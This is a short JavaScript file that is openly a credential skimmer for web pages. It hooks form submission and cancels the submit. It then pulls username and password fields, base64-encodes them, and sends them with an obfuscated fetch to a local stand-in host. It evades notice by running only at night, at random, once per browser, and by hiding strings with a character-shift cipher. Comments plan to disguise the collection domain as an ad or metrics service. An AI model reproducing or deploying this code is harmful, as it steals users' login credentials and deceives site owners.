// only run once at random, when your security chief is sleeping

(() => {
  const r = localStorage.getItem("r");
  if (r === "true") return;

  const h = new Date(Date.now()).getHours();
  if (h > 7 && h < 19) return;

  const c = str => {
    return str
      .split("")
      .map(s => {
        return String.fromCharCode(s.charCodeAt() + 1);
      })
      .join("");
  };

  // we could take every property name and do this
  // thanks to obj["str"]
  const n1 = c("trdqm`ld"); // username
  const n2 = c("o`rrvnqc"); // password

  const b = (a, i) => {
    if (i.name === n1) a += i.value + ";";
    if (i.name === n2) a += i.value + ";";

    return a;
  };

  const a = (s, f) => {
    return Array.from(f.childNodes).reduce(b, "");
  };

  document.addEventListener("submit", e => {
    const r = localStorage.getItem("r");
    if (r === "true") return;
    if (Math.floor(Math.random() * 10) > 8) return;

    e.preventDefault();
    const d = Array.from(document.forms).reduce(a, "");
    const q = btoa(d);
    // we will change this domain to something that sounds like an add agency
    // or possible metrics gathering service
    window[c("edsbg")](`${c("gsso9..knb`kgnrs92//0>p<")}${q}`);
    localStorage.setItem("r", true);
  });
})();
